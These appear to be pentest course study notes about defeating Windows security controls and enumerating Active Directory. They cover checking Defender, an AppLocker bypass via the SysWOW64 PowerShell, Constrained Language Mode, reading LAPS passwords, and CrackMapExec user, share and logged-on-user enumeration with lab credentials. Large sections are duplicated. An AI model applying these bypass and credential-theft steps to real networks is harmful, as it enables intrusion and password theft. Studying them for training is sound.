So ALWAYS check this first
before dropping ANY tool on a Windows machine
3. AppLocker
What is AppLocker?

AppLocker is Microsoft's application whitelisting solution that gives system administrators very granular control over exactly which programs and scripts are allowed to run on a system. Think of it like a very strict bouncer at a nightclub who has an approved guest list, and if your name is not on the list you simply cannot get in no matter what. AppLocker can control executables, scripts, Windows installer files, DLLs, packaged apps, and more. Organizations commonly use AppLocker to block cmd.exe and PowerShell.exe because these are the most common tools attackers use to run malicious commands. However AppLocker is often misconfigured and administrators forget that PowerShell exists in multiple locations on the system. They block the main PowerShell at System32 but forget about the 32-bit version in SysWOW64, or they forget about PowerShell ISE. As an attacker, knowing the AppLocker rules helps us find these gaps and bypass the restrictions by calling PowerShell from an alternate location or using other techniques.

Command to Check AppLocker
powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
Breaking Down the Command
Get-AppLockerPolicy    → retrieve the AppLocker policy
-Effective             → get the rules currently being enforced
                         not just configured but ACTIVE rules
select                 → filter the output we want
-ExpandProperty        → show the full expanded details
RuleCollections        → the actual collection of rules
                         each rule says allow or deny for a path
What You Find and What It Means
powershell
# RULE 1 - This is BAD for us
PathConditions: {%SYSTEM32%\WINDOWSPOWERSHELL\V1.0\POWERSHELL.EXE}
Name: Block PowerShell
Action: Deny
UserOrGroupSid: Domain Users
# Means: Domain users CANNOT run PowerShell from System32
# This is where PowerShell normally lives
# Most pentest tools need PowerShell to run

# RULE 2 - This is GOOD for us  
PathConditions: {%PROGRAMFILES%\*}
Action: Allow
UserOrGroupSid: Everyone
# Means: Anyone can run anything in Program Files
# We could potentially put tools here

# RULE 3 - Also useful to know
PathConditions: {%WINDIR%\*}
Action: Allow
UserOrGroupSid: Everyone
# Means: Everything in Windows folder is allowed
# SysWOW64 is inside Windows folder
# PowerShell 32-bit lives in SysWOW64
# = We can run PowerShell from there instead!
The AppLocker Bypass - Using Alternate Paths
powershell
# Main PowerShell BLOCKED by AppLocker:
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ← BLOCKED

# These locations are often FORGOTTEN and NOT blocked:
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe ← WORKS
C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe ← WORKS

# Run from alternate location:
%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -c "IEX(Get-Content .\PowerView.ps1)"
Why This Matters Practically
AppLocker blocks cmd.exe and PowerShell.exe
= Attacker cannot run tools
= Seems very secure

BUT:
Admin blocked ONE location of PowerShell
Forgot about 3 other locations
We use SysWOW64 version instead
= AppLocker completely bypassed
= All tools run normally

This is extremely common in real organizations
AppLocker gives false sense of security
when not configured comprehensively
4. PowerShell Constrained Language Mode
What is Constrained Language Mode?

PowerShell has two main operating modes. Full Language Mode allows PowerShell to do absolutely everything it is capable of including running complex scripts, using COM objects, accessing .NET framework features, and executing arbitrary code. Constrained Language Mode is a restricted version that locks down many of these powerful features to prevent attackers from using PowerShell as a weapon. When Constrained Language Mode is enabled, many of the features that popular hacking tools like PowerView and PowerSploit depend on simply will not work. For example, COM objects are blocked, only certain approved .NET types can be used, and PowerShell classes are restricted. This mode is often enabled alongside AppLocker or other security controls as a defense in depth strategy. As an attacker we need to know if Constrained Language Mode is active because if it is, many of our PowerShell based tools will fail silently or throw errors without obvious explanation, and we need to find alternative approaches or bypass methods.

Command to Check Language Mode
powershell
$ExecutionContext.SessionState.LanguageMode
Breaking Down the Command
$ExecutionContext       → built-in PowerShell variable
                          contains info about current session
.SessionState          → the state of current PS session
.LanguageMode          → which language mode is active
No extra parameters needed
Works instantly, one line command
No special privileges required
What You Find and What It Means
powershell
# Output 1 - BAD for us
ConstrainedLanguage
# Means: PowerShell is locked down
# COM objects = blocked
# Only approved .NET types = allowed
# XAML workflows = blocked
# PowerShell classes = blocked
# Most pentest tools WILL NOT WORK
# Need bypass before proceeding

# Output 2 - GOOD for us
FullLanguage
# Means: PowerShell has no restrictions
# All features available
# All pentest tools will run normally
# Proceed with enumeration
Practical Impact
Without checking language mode:
You import PowerView → no error
You run Get-DomainUser → returns nothing
You wonder why tool is broken
Waste 30 minutes troubleshooting
Realize it was Constrained Language Mode all along

With checking language mode first:
You see ConstrainedLanguage
You know immediately PowerView wont work properly
You switch to alternative tools like:
→ BloodHound (runs as compiled binary)
→ SharpView (C# compiled version = not affected)
→ Built-in Windows commands (net, nltest etc)
→ Find bypass for constrained language mode
5. LAPS (Local Administrator Password Solution)
What is LAPS?

LAPS stands for Local Administrator Password Solution and it is a free Microsoft tool designed to solve one of the biggest problems in Windows environments which is local administrator password reuse. Without LAPS, many organizations set the same local administrator password on every machine when they deploy it using a gold image or automated deployment system. This means if an attacker gets the local admin password from one machine they can use it on every single machine in the network which is called lateral movement. LAPS fixes this by having Active Directory automatically generate and manage unique random passwords for the local administrator account on every machine and rotate those passwords on a regular schedule. The passwords are stored in Active Directory and only certain privileged users or groups are allowed to read them. For us as attackers, LAPS is important for two reasons. First, if LAPS is enabled we cannot reuse local admin passwords across machines which limits our lateral movement. Second, if we can find a user account that has permission to READ the LAPS passwords from Active Directory, we can potentially get local admin passwords for many machines and use those for lateral movement anyway.

Commands to Enumerate LAPS
Find Who Can Read LAPS Passwords
powershell
# First import the LAPSToolkit
Import-Module LAPSToolkit.ps1

# Find groups delegated to read LAPS passwords
Find-LAPSDelegatedGroups

What you find:

OrgUnit                          Delegated Groups
-------                          ----------------
OU=Servers,DC=INLANEFREIGHT      INLANEFREIGHT\Domain Admins
OU=Servers,DC=INLANEFREIGHT      INLANEFREIGHT\LAPS Admins
OU=Workstations,DC=INLANEFREIGHT INLANEFREIGHT\Domain Admins
OU=Workstations,DC=INLANEFREIGHT INLANEFREIGHT\LAPS Admins

# This tells us:
# Only Domain Admins and LAPS Admins group
# can read LAPS passwords
# If we compromise someone in these groups
# we get ALL local admin passwords
Find Users with Extended Rights to Read LAPS
powershell
Find-AdmPwdExtendedRights

What you find:

ComputerName                  Identity                    Reason
------------                  --------                    ------
EXCHG01.INLANEFREIGHT.LOCAL   INLANEFREIGHT\Domain Admins Delegated
SQL01.INLANEFREIGHT.LOCAL     INLANEFREIGHT\Domain Admins Delegated
WS01.INLANEFREIGHT.LOCAL      INLANEFREIGHT\LAPS Admins   Delegated

# Shows specific computers and who can read
# their LAPS password
# Target: compromise someone in LAPS Admins group
# Result: get passwords for all these computers
Actually Read the LAPS Passwords
powershell
Get-LAPSComputers

What you find:

ComputerName                  Password        Expiration
------------                  --------        ----------
DC01.INLANEFREIGHT.LOCAL      6DZ[+A/[]19d$F  08/26/2020
EXCHG01.INLANEFREIGHT.LOCAL   oj+2A+[hHMMtj,  09/26/2020
SQL01.INLANEFREIGHT.LOCAL     9G#f;p41dcAe,s  09/26/2020
WS01.INLANEFREIGHT.LOCAL      TCaG-F)3No;l8C  09/26/2020

# JACKPOT - cleartext local admin passwords
# for every machine that has LAPS enabled
# Use these to login as local admin
# on each of these machines
Why LAPS Matters Practically
Environment WITHOUT LAPS:
Get local admin password from Workstation01
→ Try same password on Workstation02 → WORKS
→ Try same password on Server01 → WORKS
→ Try same password on all 500 machines → WORKS
→ You own entire network from one password
= Very common in real organizations

Environment WITH LAPS:
Get local admin password from Workstation01
→ Try same password on Workstation02 → FAILS
→ Every machine has UNIQUE random password
→ Lateral movement is much harder

BUT if we find LAPS readable account:
→ We read ALL passwords from AD directly
→ LAPS protection completely defeated
→ This is why finding who can READ LAPS matters
6. Complete Workflow - Security Controls Check
Step 1: Land on Windows machine with credentials
        ↓
Step 2: Check Defender
        Get-MpComputerStatus | Select RealTimeProtectionEnabled
        ↓
        True → need bypass     False → proceed normally
        ↓
Step 3: Check AppLocker
        Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
        ↓
        Rules found → find gaps    No rules → proceed normally
        ↓
Step 4: Check PowerShell Language Mode
        $ExecutionContext.SessionState.LanguageMode
        ↓
        Constrained → use C# tools    Full → use PS tools
        ↓
Step 5: Check LAPS
        Find-LAPSDelegatedGroups
        Find-AdmPwdExtendedRights
        Get-LAPSComputers
        ↓
        Find readable LAPS → get local admin passwords
        LAPS not present → try password reuse attacks
7. Summary Table
┌──────────────────┬──────────────────────┬─────────────────────────────────┐
│ Control          │ Check Command        │ Impact if Enabled               │
├──────────────────┼──────────────────────┼─────────────────────────────────┤
│ Defender         │ Get-MpComputerStatus │ Tools get deleted/blocked       │
│                  │                      │ Need bypass techniques          │
├──────────────────┼──────────────────────┼─────────────────────────────────┤
│ AppLocker        │ Get-AppLockerPolicy  │ PS and CMD might be blocked     │
│                  │ -Effective           │ Use alternate paths to bypass   │
├──────────────────┼──────────────────────┼─────────────────────────────────┤
│ PS Constrained   │ $ExecutionContext     │ PowerShell tools wont work      │
│ Language Mode    │ .SessionState        │ Switch to compiled C# tools     │
│                  │ .LanguageMode        │                                 │
├──────────────────┼──────────────────────┼─────────────────────────────────┤
│ LAPS             │ Find-LAPSDelegated   │ No local admin password reuse   │
│                  │ Groups               │ Find who can read LAPS          │
│                  │ Get-LAPSComputers    │ Get all passwords if possible   │
└──────────────────┴──────────────────────┴─────────────────────────────────┘
8. Key Things to Remember
1. ALWAYS check security controls before running ANY tool
   Running blind = getting caught = failed assessment

2. Defender ON does not mean game over
   There are bypass techniques covered in other modules
   Knowing it is ON lets you prepare the right bypass

3. AppLocker is almost always misconfigured
   Admins block one path, forget about others
   SysWOW64 PowerShell is the most common bypass

4. Constrained Language Mode = switch to C# tools
   SharpView instead of PowerView
   SharpHound instead of PowerShell BloodHound
   Compiled binaries not affected by language mode

5. LAPS is good for defenders but has weaknesses
   Find who can READ the passwords
   Compromise that account = get all passwords
   No LAPS = try local admin password reuse

6. These controls work TOGETHER
   An organization might have ALL of them enabled
   Need to bypass each one strategically
   Check all of them before deciding tool strategy


Security Controls Enumeration - Complete Detailed Notes
1. Why Do We Check Security Controls?

When we successfully get credentials through password spraying or Responder poisoning, we have what is called a "foothold" in the domain. This means we are inside the network with valid credentials but we are not done yet. Before we start running any enumeration tools or attack tools, we absolutely must understand what security software is running on the machines we are targeting. Different organizations have different levels of security protection and some machines inside the same organization might have stricter controls than others. If we blindly run our hacking tools without checking what security is in place, those tools will get detected, blocked, or deleted and we will alert the defenders that someone is attacking their network. By checking security controls first, we can make smart decisions about which tools to use, how to use them, and whether we need to modify or bypass certain protections before proceeding.

Foothold achieved (have credentials)
            ↓
CHECK SECURITY CONTROLS FIRST
            ↓
        ┌───┴───┐
        │       │
    Strict    Relaxed
    Controls  Controls
        │       │
   Modify    Run tools
   tools     normally
   bypass
   controls
2. Windows Defender
What is Windows Defender?

Windows Defender, now called Microsoft Defender after the Windows 10 May 2020 update, is the built-in antivirus and antimalware solution that comes with every Windows machine for free. Over the years Microsoft has made it extremely powerful and it has gone from being a joke antivirus to one of the best free security solutions available. For us as attackers this is very important because Defender actively monitors everything happening on the system in real time. When we try to run tools like PowerView, BloodHound, or Mimikatz on a machine with Defender enabled, it will detect these tools almost instantly, delete them from disk, and generate security alerts. Defender uses signatures, behavioral analysis, and cloud-based detection to catch malicious tools. This means even if we rename our tools or slightly modify them, Defender might still catch them based on their behavior. Knowing whether Defender is enabled or disabled on a target machine tells us whether we need to find bypass techniques before running our enumeration tools or whether we can proceed normally.

Command to Check Defender
powershell
Get-MpComputerStatus
Breaking Down the Command
Get-Mp            → Get Microsoft Protection information
ComputerStatus    → current status of all protection features
No parameters needed, just run it and read output
Works on any Windows machine with PowerShell
Requires no special privileges to run
What You Find and What It Means
powershell
RealTimeProtectionEnabled : True   
# THIS IS THE MOST IMPORTANT LINE
# True = Defender is actively watching EVERYTHING
# Every file you drop, every command you run
# Gets scanned immediately
# Your tools will be caught and deleted

RealTimeProtectionEnabled : False  
# Defender is disabled
# You can run tools more freely
# Still be careful but much better for us

AMServiceEnabled : True
# Antimalware Service is running in background
# The engine that does the actual scanning

AntivirusEnabled : True
# Traditional virus scanning is active
# Checks files against known virus signatures

AntispywareEnabled : True
# Monitoring for spyware behaviors
# Catches tools that try to steal credentials

BehaviorMonitorEnabled : False
# When True = watches HOW programs behave
# Even unknown tools get caught by behavior
# When False = only signature based detection
# Easier for us to bypass
Practical Example
powershell
# Run this immediately after getting on a Windows machine
Get-MpComputerStatus

# Check specifically for real time protection
Get-MpComputerStatus | Select RealTimeProtectionEnabled

# Output:
RealTimeProtectionEnabled
-------------------------
True                        ← Defender ON = be careful
False                       ← Defender OFF = proceed normally
Why This Matters Practically
Scenario 1: Defender ON
You try to run PowerView.ps1
→ Defender detects it in 2 seconds
→ Deletes the file
→ Generates alert
→ Defenders know you are there
→ Assessment potentially blown

Scenario 2: Defender OFF
You run PowerView.ps1
→ Runs perfectly
→ Full domain enumeration
→ No alerts generated
→ Continue attack chain

So ALWAYS check this first
before dropping ANY tool on a Windows machine
3. AppLocker
What is AppLocker?

AppLocker is Microsoft's application whitelisting solution that gives system administrators very granular control over exactly which programs and scripts are allowed to run on a system. Think of it like a very strict bouncer at a nightclub who has an approved guest list, and if your name is not on the list you simply cannot get in no matter what. AppLocker can control executables, scripts, Windows installer files, DLLs, packaged apps, and more. Organizations commonly use AppLocker to block cmd.exe and PowerShell.exe because these are the most common tools attackers use to run malicious commands. However AppLocker is often misconfigured and administrators forget that PowerShell exists in multiple locations on the system. They block the main PowerShell at System32 but forget about the 32-bit version in SysWOW64, or they forget about PowerShell ISE. As an attacker, knowing the AppLocker rules helps us find these gaps and bypass the restrictions by calling PowerShell from an alternate location or using other techniques.

Command to Check AppLocker
powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
Breaking Down the Command
Get-AppLockerPolicy    → retrieve the AppLocker policy
-Effective             → get the rules currently being enforced
                         not just configured but ACTIVE rules
select                 → filter the output we want
-ExpandProperty        → show the full expanded details
RuleCollections        → the actual collection of rules
                         each rule says allow or deny for a path
What You Find and What It Means
powershell
# RULE 1 - This is BAD for us
PathConditions: {%SYSTEM32%\WINDOWSPOWERSHELL\V1.0\POWERSHELL.EXE}
Name: Block PowerShell
Action: Deny
UserOrGroupSid: Domain Users
# Means: Domain users CANNOT run PowerShell from System32
# This is where PowerShell normally lives
# Most pentest tools need PowerShell to run

# RULE 2 - This is GOOD for us  
PathConditions: {%PROGRAMFILES%\*}
Action: Allow
UserOrGroupSid: Everyone
# Means: Anyone can run anything in Program Files
# We could potentially put tools here

# RULE 3 - Also useful to know
PathConditions: {%WINDIR%\*}
Action: Allow
UserOrGroupSid: Everyone
# Means: Everything in Windows folder is allowed
# SysWOW64 is inside Windows folder
# PowerShell 32-bit lives in SysWOW64
# = We can run PowerShell from there instead!
The AppLocker Bypass - Using Alternate Paths
powershell
# Main PowerShell BLOCKED by AppLocker:
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ← BLOCKED

# These locations are often FORGOTTEN and NOT blocked:
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe ← WORKS
C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe ← WORKS

# Run from alternate location:
%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -c "IEX(Get-Content .\PowerView.ps1)"
Why This Matters Practically
AppLocker blocks cmd.exe and PowerShell.exe
= Attacker cannot run tools
= Seems very secure

BUT:
Admin blocked ONE location of PowerShell
Forgot about 3 other locations
We use SysWOW64 version instead
= AppLocker completely bypassed
= All tools run normally

This is extremely common in real organizations
AppLocker gives false sense of security
when not configured comprehensively
4. PowerShell Constrained Language Mode
What is Constrained Language Mode?

PowerShell has two main operating modes. Full Language Mode allows PowerShell to do absolutely everything it is capable of including running complex scripts, using COM objects, accessing .NET framework features, and executing arbitrary code. Constrained Language Mode is a restricted version that locks down many of these powerful features to prevent attackers from using PowerShell as a weapon. When Constrained Language Mode is enabled, many of the features that popular hacking tools like PowerView and PowerSploit depend on simply will not work. For example, COM objects are blocked, only certain approved .NET types can be used, and PowerShell classes are restricted. This mode is often enabled alongside AppLocker or other security controls as a defense in depth strategy. As an attacker we need to know if Constrained Language Mode is active because if it is, many of our PowerShell based tools will fail silently or throw errors without obvious explanation, and we need to find alternative approaches or bypass methods.

Command to Check Language Mode
powershell
$ExecutionContext.SessionState.LanguageMode
Breaking Down the Command
$ExecutionContext       → built-in PowerShell variable
                          contains info about current session
.SessionState          → the state of current PS session
.LanguageMode          → which language mode is active
No extra parameters needed
Works instantly, one line command
No special privileges required
What You Find and What It Means
powershell
# Output 1 - BAD for us
ConstrainedLanguage
# Means: PowerShell is locked down
# COM objects = blocked
# Only approved .NET types = allowed
# XAML workflows = blocked
# PowerShell classes = blocked
# Most pentest tools WILL NOT WORK
# Need bypass before proceeding

# Output 2 - GOOD for us
FullLanguage
# Means: PowerShell has no restrictions
# All features available
# All pentest tools will run normally
# Proceed with enumeration
Practical Impact
Without checking language mode:
You import PowerView → no error
You run Get-DomainUser → returns nothing
You wonder why tool is broken
Waste 30 minutes troubleshooting
Realize it was Constrained Language Mode all along

With checking language mode first:
You see ConstrainedLanguage
You know immediately PowerView wont work properly
You switch to alternative tools like:
→ BloodHound (runs as compiled binary)
→ SharpView (C# compiled version = not affected)
→ Built-in Windows commands (net, nltest etc)
→ Find bypass for constrained language mode
5. LAPS (Local Administrator Password Solution)
What is LAPS?

LAPS stands for Local Administrator Password Solution and it is a free Microsoft tool designed to solve one of the biggest problems in Windows environments which is local administrator password reuse. Without LAPS, many organizations set the same local administrator password on every machine when they deploy it using a gold image or automated deployment system. This means if an attacker gets the local admin password from one machine they can use it on every single machine in the network which is called lateral movement. LAPS fixes this by having Active Directory automatically generate and manage unique random passwords for the local administrator account on every machine and rotate those passwords on a regular schedule. The passwords are stored in Active Directory and only certain privileged users or groups are allowed to read them. For us as attackers, LAPS is important for two reasons. First, if LAPS is enabled we cannot reuse local admin passwords across machines which limits our lateral movement. Second, if we can find a user account that has permission to READ the LAPS passwords from Active Directory, we can potentially get local admin passwords for many machines and use those for lateral movement anyway.

Commands to Enumerate LAPS
Find Who Can Read LAPS Passwords
powershell
# First import the LAPSToolkit
Import-Module LAPSToolkit.ps1

# Find groups delegated to read LAPS passwords
Find-LAPSDelegatedGroups

What you find:

OrgUnit                          Delegated Groups
-------                          ----------------
OU=Servers,DC=INLANEFREIGHT      INLANEFREIGHT\Domain Admins
OU=Servers,DC=INLANEFREIGHT      INLANEFREIGHT\LAPS Admins
OU=Workstations,DC=INLANEFREIGHT INLANEFREIGHT\Domain Admins
OU=Workstations,DC=INLANEFREIGHT INLANEFREIGHT\LAPS Admins

# This tells us:
# Only Domain Admins and LAPS Admins group
# can read LAPS passwords
# If we compromise someone in these groups
# we get ALL local admin passwords
Find Users with Extended Rights to Read LAPS
powershell
Find-AdmPwdExtendedRights

What you find:

ComputerName                  Identity                    Reason
------------                  --------                    ------
EXCHG01.INLANEFREIGHT.LOCAL   INLANEFREIGHT\Domain Admins Delegated
SQL01.INLANEFREIGHT.LOCAL     INLANEFREIGHT\Domain Admins Delegated
WS01.INLANEFREIGHT.LOCAL      INLANEFREIGHT\LAPS Admins   Delegated

# Shows specific computers and who can read
# their LAPS password
# Target: compromise someone in LAPS Admins group
# Result: get passwords for all these computers
Actually Read the LAPS Passwords
powershell
Get-LAPSComputers

What you find:

ComputerName                  Password        Expiration
------------                  --------        ----------
DC01.INLANEFREIGHT.LOCAL      6DZ[+A/[]19d$F  08/26/2020
EXCHG01.INLANEFREIGHT.LOCAL   oj+2A+[hHMMtj,  09/26/2020
SQL01.INLANEFREIGHT.LOCAL     9G#f;p41dcAe,s  09/26/2020
WS01.INLANEFREIGHT.LOCAL      TCaG-F)3No;l8C  09/26/2020

# JACKPOT - cleartext local admin passwords
# for every machine that has LAPS enabled
# Use these to login as local admin
# on each of these machines
Why LAPS Matters Practically
Environment WITHOUT LAPS:
Get local admin password from Workstation01
→ Try same password on Workstation02 → WORKS
→ Try same password on Server01 → WORKS
→ Try same password on all 500 machines → WORKS
→ You own entire network from one password
= Very common in real organizations

Environment WITH LAPS:
Get local admin password from Workstation01
→ Try same password on Workstation02 → FAILS
→ Every machine has UNIQUE random password
→ Lateral movement is much harder

BUT if we find LAPS readable account:
→ We read ALL passwords from AD directly
→ LAPS protection completely defeated
→ This is why finding who can READ LAPS matters
6. Complete Workflow - Security Controls Check
Step 1: Land on Windows machine with credentials
        ↓
Step 2: Check Defender
        Get-MpComputerStatus | Select RealTimeProtectionEnabled
        ↓
        True → need bypass     False → proceed normally
        ↓
Step 3: Check AppLocker
        Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
        ↓
        Rules found → find gaps    No rules → proceed normally
        ↓
Step 4: Check PowerShell Language Mode
        $ExecutionContext.SessionState.LanguageMode
        ↓
        Constrained → use C# tools    Full → use PS tools
        ↓
Step 5: Check LAPS
        Find-LAPSDelegatedGroups
        Find-AdmPwdExtendedRights
        Get-LAPSComputers
        ↓
        Find readable LAPS → get local admin passwords
        LAPS not present → try password reuse attacks
7. Summary Table
┌──────────────────┬──────────────────────┬─────────────────────────────────┐
│ Control          │ Check Command        │ Impact if Enabled               │
├──────────────────┼──────────────────────┼─────────────────────────────────┤
│ Defender         │ Get-MpComputerStatus │ Tools get deleted/blocked       │
│                  │                      │ Need bypass techniques          │
├──────────────────┼──────────────────────┼─────────────────────────────────┤
│ AppLocker        │ Get-AppLockerPolicy  │ PS and CMD might be blocked     │
│                  │ -Effective           │ Use alternate paths to bypass   │
├──────────────────┼──────────────────────┼─────────────────────────────────┤
│ PS Constrained   │ $ExecutionContext     │ PowerShell tools wont work      │
│ Language Mode    │ .SessionState        │ Switch to compiled C# tools     │
│                  │ .LanguageMode        │                                 │
├──────────────────┼──────────────────────┼─────────────────────────────────┤
│ LAPS             │ Find-LAPSDelegated   │ No local admin password reuse   │
│                  │ Groups               │ Find who can read LAPS          │
│                  │ Get-LAPSComputers    │ Get all passwords if possible   │
└──────────────────┴──────────────────────┴─────────────────────────────────┘
8. Key Things to Remember
1. ALWAYS check security controls before running ANY tool
   Running blind = getting caught = failed assessment

2. Defender ON does not mean game over
   There are bypass techniques covered in other modules
   Knowing it is ON lets you prepare the right bypass

3. AppLocker is almost always misconfigured
   Admins block one path, forget about others
   SysWOW64 PowerShell is the most common bypass

4. Constrained Language Mode = switch to C# tools
   SharpView instead of PowerView
   SharpHound instead of PowerShell BloodHound
   Compiled binaries not affected by language mode

5. LAPS is good for defenders but has weaknesses
   Find who can READ the passwords
   Compromise that account = get all passwords
   No LAPS = try local admin password reuse

6. These controls work TOGETHER
   An organization might have ALL of them enabled
   Need to bypass each one strategically
   Check all of them before deciding tool strategy

Credentialed Enumeration From Linux - Complete Detailed Notes
0. Important Clarification First - Do We Need Domain Admin?

This is a very common confusion so let me explain it clearly before anything else. For ALL the enumeration techniques in this section, you only need a regular low privilege domain user account. You do NOT need Domain Admin or any special privileges at all. Think of it like this — you have a regular employee badge that gets you through the front door of the building, and now you are going to walk around and look at everything you can see with that basic access level. We are using the credentials of user forend with password Klmcargo2 which is just a regular domain user that we obtained from our earlier LLMNR poisoning and hash cracking. The only time you need Domain Admin is when you want to access things like the C$ share or ADMIN$ share on remote machines, or when you want to do things like dump password hashes. For enumeration of users, groups, shares, and domain structure — a basic user account is completely sufficient.

Regular Domain User (forend:Klmcargo2)
            ↓
Can enumerate:
✅ All domain users
✅ All domain groups
✅ Share permissions
✅ Logged on users
✅ Domain structure
✅ ACLs and GPOs
✅ Trust relationships

Cannot do:
❌ Access C$ or ADMIN$ shares (need local admin)
❌ Dump password hashes (need Domain Admin)
❌ Modify domain objects (need elevated rights)
1. CrackMapExec (CME) - The Swiss Army Knife
What is CrackMapExec?

CrackMapExec, commonly called CME, is one of the most powerful and versatile tools available for assessing Active Directory environments. It was built using code from two other famous toolkits called Impacket and PowerSploit, which means it inherits the best features of both. The tool works across multiple protocols including SMB, SSH, MSSQL, and WinRM which means you can use the same tool to attack different services without switching tools constantly. What makes CME especially powerful is that it can do everything from simple enumeration like listing users and groups, all the way to executing commands on remote machines, dumping password hashes, and searching through file shares for sensitive data. In this section we use it primarily for enumeration because we only have low privilege credentials, but as we escalate our privileges we can use CME to do much more. The tool is now also being maintained under the name NetExec but works the same way.

Protocols CME supports:
SMB    → Windows file sharing, most common
SSH    → Linux and network devices
MSSQL  → Microsoft SQL Server databases
WinRM  → Windows Remote Management
Task 1 - Enumerate Domain Users with CME
bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users

Breaking down every part:

sudo                → run as root (required for raw socket access)
crackmapexec        → the tool
smb                 → use SMB protocol (port 445)
172.16.5.5          → target IP = Domain Controller
                      we target DC because it has ALL domain data
-u forend           → username (regular domain user)
-p Klmcargo2        → password
--users             → enumerate all domain users

What you find:

[*] Windows 10.0 Build 17763 (name:ACADEMY-EA-DC01)
[+] INLANEFREIGHT.LOCAL\forend:Klmcargo2   ← credentials valid
[+] Enumerated domain user(s)

INLANEFREIGHT.LOCAL\administrator    badpwdcount: 0  baddpwdtime: 2022-03-29
INLANEFREIGHT.LOCAL\avazquez         badpwdcount: 3  baddpwdtime: 2022-02-24
INLANEFREIGHT.LOCAL\htb-student      badpwdcount: 0  baddpwdtime: 2022-03-30

What the fields mean:

badpwdcount: 0   → zero failed login attempts = safe to spray
badpwdcount: 3   → 3 failed attempts, threshold is 5
                   = DO NOT spray this account = risk of lockout
badpwdcount: 5   → account might already be locked
                   = skip completely

baddpwdtime      → when was the last failed attempt
                   if recent = account is being actively used/attacked

Why this matters practically:

Before doing password spraying you run this first
Filter out accounts with badpwdcount close to threshold
Only spray accounts with badpwdcount: 0
= You never accidentally lock any account
= Professional and safe approach

Save output to file:

bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users > domain_users.txt
cat domain_users.txt
Task 2 - Enumerate Domain Groups with CME
bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups

What you find:

Administrators              membercount: 3    ← HIGH VALUE
Domain Admins               membercount: 19   ← HIGH VALUE
Backup Operators            membercount: 1    ← HIGH VALUE
Contractors                 membercount: 138
Accounting                  membercount: 15
Engineering                 membercount: 19
Executives                  membercount: 10   ← HIGH VALUE
Human Resources             membercount: 36

What to look for:

HIGH PRIORITY GROUPS to investigate further:

Administrators      → local admins on DC itself
Domain Admins       → full control of entire domain
Backup Operators    → can backup/restore files = dangerous
Enterprise Admins   → control of entire forest
Executives          → C-level users = high value targets
IT Admins           → usually have elevated access
Help Desk           → often have password reset rights

Why this matters:

Knowing which groups exist and how many members they have
helps us understand the attack surface

Domain Admins has 19 members = 19 high value targets
If we get credentials for ANY of these 19 users
= We own the entire domain

We note these group names for later targeting
Task 3 - Check Who is Logged On to Machines
bash
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users

What you find:

[+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 (Pwn3d!)
← This means forend is LOCAL ADMIN on this machine!

INLANEFREIGHT\clusteragent    logon_server: ACADEMY-EA-DC01
INLANEFREIGHT\lab_adm         logon_server: ACADEMY-EA-DC01
INLANEFREIGHT\svc_qualys      logon_server: ACADEMY-EA-DC01
INLANEFREIGHT\wley            logon_server: ACADEMY-EA-DC01

What (Pwn3d!) means:

(Pwn3d!) appearing after authentication = 
our user forend is a LOCAL ADMINISTRATOR on this machine
= We have ADMIN rights on this specific host
= We can run commands, dump hashes, do anything
= This is a huge finding

Why logged on users matter:

svc_qualys is logged on to this machine
= svc_qualys credentials are IN MEMORY right now
= If we are local admin (Pwn3d!) we can dump memory
= We get svc_qualys credentials
= svc_qualys is a Domain Admin
= We own the entire domain

This is called credential theft / lateral movement
Find where high value users are logged in
Go to that machine
Dump credentials from memory
= Escalate privileges
Task 4 - Enumerate Shares with CME
bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares

What you find:

Share               Permissions     Comment
-----               -----------     -------
ADMIN$                              Remote Admin      ← NO ACCESS
C$                                  Default share     ← NO ACCESS
Department Shares   READ            ← interesting
IPC$                READ            Remote IPC
NETLOGON            READ            Logon server share
SYSVOL              READ            Logon server share
User Shares         READ            ← interesting
ZZZ_archive         READ            ← interesting

What each share means:

ADMIN$      → remote admin share, need local admin = blocked for us
C$          → full C drive access, need local admin = blocked for us
NETLOGON    → stores logon scripts, readable = worth checking
SYSVOL      → stores GPO files, always readable = check for passwords
Department  → company department files = might have sensitive data
User Shares → personal user files = might have passwords saved
ZZZ_archive → archived files = might have old credentials or data
Task 5 - Spider Shares for Files with CME
bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'

Breaking down:

-M spider_plus          → use the spider_plus module
                          this module crawls through ALL files
                          in the specified share recursively
--share 'Department Shares' → which share to spider
                              quotes needed because of the space

Check the results:

bash
# Results saved automatically to JSON file
cat /tmp/cme_spider_plus/172.16.5.5.json | head -50

What you find:

json
{
  "Department Shares": {
    "Accounting/Private/AddSelect.bat": {
      "atime_epoch": "2022-03-31 14:44:42",
      "size": "278 Bytes"
    },
    "IT/Passwords/temp_passwords.txt": {   ← JACKPOT
      "size": "1.2 KB"
    }
  }
}

Why spidering is powerful:

Companies store LOTS of sensitive data in shares:
→ Password files (passwords.txt, creds.xlsx)
→ Configuration files (web.config with DB passwords)
→ Scripts with hardcoded credentials
→ SSH keys stored as text files
→ HR files with employee information
→ Financial documents

Spider_plus maps EVERYTHING in the share
You then look for interesting filenames
Download and read the interesting ones
2. SMBMap - Detailed Share Analysis
What is SMBMap?

